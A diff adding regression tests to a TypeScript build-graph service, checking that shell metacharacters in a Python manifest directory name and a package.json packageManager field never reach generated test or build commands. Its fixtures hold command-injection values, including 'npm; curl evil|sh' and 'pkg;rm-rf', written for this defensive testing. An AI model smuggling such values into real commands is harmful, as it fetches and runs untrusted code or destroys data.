@@ -389,6 +389,84 @@ describe('build graph service', () => {
     FILESYSTEM_DISCOVERY_TIMEOUT_MS,
   )
 
+  // F4 regression pin (python resolver command-token whitelist): a manifest
+  // directory containing a shell metacharacter keeps its target but gets NO
+  // interpolated testCommand, exactly like the cargo/go/jvm/dotnet resolvers.
+  test('omits the python test command for a manifest directory with shell metacharacters', () => {
+    const root = tempRoot()
+    writeFixture(root, 'pkg;rm-rf/pyproject.toml', '[project]\nname="p"\n')
+    const [resolution] = resolveOwningTargets({
+      cwd: root,
+      files: ['pkg;rm-rf/mod.py'],
+      runner: failingRunner,
+    })
+    expect(resolution).toMatchObject({
+      ecosystem: 'python',
+      confidence: 'inferred',
+      targets: [{ name: 'pkg;rm-rf', kind: 'package', root: 'pkg;rm-rf' }],
+    })
+    expect(resolution.targets[0]?.testCommand).toBeUndefined()
+  })
+
+  // BG-1 regression pin (javascript resolver command-token whitelist): the
+  // `packageManager` field is attacker-controlled manifest content and is
+  // interpolated as the `${manager} run <script>` prefix. A metacharacter-
+  // bearing manager must NOT reach the command string; the recommendation
+  // falls back to 'npm' so the target keeps usable commands.
+  test(
+    'falls back to npm for a packageManager field with shell metacharacters',
+    () => {
+      const root = tempRoot()
+      writeFixture(
+        root,
+        'package.json',
+        JSON.stringify({
+          name: 'web',
+          packageManager: 'npm; curl evil|sh',
+          scripts: { test: 'vitest run', build: 'tsc -b' },
+        }),
+      )
+      const [resolution] = resolveOwningTargets({
+        cwd: root,
+        files: ['src/index.ts'],
+        runner: failingRunner,
+      })
+      expect(resolution.ecosystem).toBe('javascript')
+      // The target keeps usable commands, but with the sanitized fallback
+      // manager — never the hostile token.
+      expect(resolution.targets).toHaveLength(1)
+      expect(resolution.targets[0]?.testCommand).toBe('npm run test')
+      expect(resolution.targets[0]?.buildCommand).toBe('npm run build')
+    },
+    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
+  )
+
+  // Positive pin: a legitimate version-pinned `packageManager` must still
+  // produce a command naming the real manager, not the 'npm' fallback.
+  test(
+    'keeps the manager name for a version-pinned packageManager field',
+    () => {
+      const root = tempRoot()
+      writeFixture(
+        root,
+        'package.json',
+        JSON.stringify({
+          name: 'web',
+          packageManager: 'pnpm@9.0.0+sha256.abc',
+          scripts: { test: 'vitest run' },
+        }),
+      )
+      const [resolution] = resolveOwningTargets({
+        cwd: root,
+        files: ['src/index.ts'],
+        runner: failingRunner,
+      })
+      expect(resolution.ecosystem).toBe('javascript')
+      expect(resolution.targets[0]?.testCommand).toBe('pnpm run test')
+    },
+    FILESYSTEM_DISCOVERY_TIMEOUT_MS,
+  )
+
   test('caps the number of files resolved per call', () => {
     const root = tempRoot()
     const files = Array.from({ length: 501 }, (_, index) => `f-${index}.ts`)
